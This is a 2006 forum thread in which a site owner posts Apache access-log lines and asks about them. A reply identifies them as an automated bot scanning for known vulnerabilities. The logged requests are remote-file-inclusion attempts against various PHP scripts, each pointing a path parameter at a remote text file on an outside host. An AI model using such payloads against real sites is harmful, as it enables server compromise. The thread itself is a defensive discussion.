---
title: "[SOLVED] Suspicious Apache log (never seen before)"
date: 2006-09-26
forum: Server Platforms
---

### Post by altonbr on 2006-09-26
Hey guys,

I've been checking my /var/log/apache2/access.log file as often as possible (2-3 times a week) and I JUST came across this odd statement:

```
199.248.240.27 - - [25/Sep/2006:00:17:50 -0400] "GET /confirm.php?include_location=http://65.254.62.202/dir/t.txt? HTTP/1.1" 404 299 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
199.248.240.27 - - [25/Sep/2006:00:17:50 -0400] "GET /index.php?include_location=http://65.254.62.202/dir/t.txt? HTTP/1.1" 404 297 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
199.248.240.27 - - [25/Sep/2006:00:17:50 -0400] "GET /login.php?include_location=http://65.254.62.202/dir/t.txt? HTTP/1.1" 404 297 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
199.248.240.27 - - [25/Sep/2006:00:17:50 -0400] "GET /e/class/checklevel.php?check_path=http://65.254.62.202/dir/t.txt? HTTP/1.1" 404 310 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
199.248.240.27 - - [25/Sep/2006:00:17:51 -0400] "GET /modules/PNphpBB2/includes/functions_admin.php?phpbb_root_path=http://65.254.62.202/dir/t.txt? HTTP/1.1" 404 333 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
199.248.240.27 - - [25/Sep/2006:00:17:51 -0400] "GET /inc/cmses/aedatingCMS.php?dir[inc]=http://65.254.62.202/dir/t.txt? HTTP/1.1" 404 313 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
199.248.240.27 - - [25/Sep/2006:00:17:51 -0400] "GET /functions.php?include_path=http://65.254.62.202/dir/t.txt? HTTP/1.1" 404 301 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
199.248.240.27 - - [25/Sep/2006:00:17:51 -0400] "GET /mod_phpalbum/sommaire_admin.php?chemin=http://65.254.62.202/dir/t.txt? HTTP/1.1" 404 319 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
199.248.240.27 - - [25/Sep/2006:00:17:52 -0400] "GET /coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]=http://65.254.62.202/dir/t.txt? HTTP/1.1" 404 315 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
```

It seems REALLY suspicious to me as an amateur web developer. Can anyone tell me what's going on? It looks like the guy was looking for a phpBB forum to hack.

Thanks.

---

### Post by altonbr on 2006-10-01
So is this just nothing and I should forget about it?

---

### Post by mrcowcow on 2006-10-01
It looks like it was just a bot looking to expliot known security holes in various popular applications. As long as all the stuff you use is up to date, you should be fine. I find stuff like this in my logs fairly often, so its nothing too uncommon.

---

### Post by altonbr on 2006-10-01
Ok, thanks for the quick reply.

---

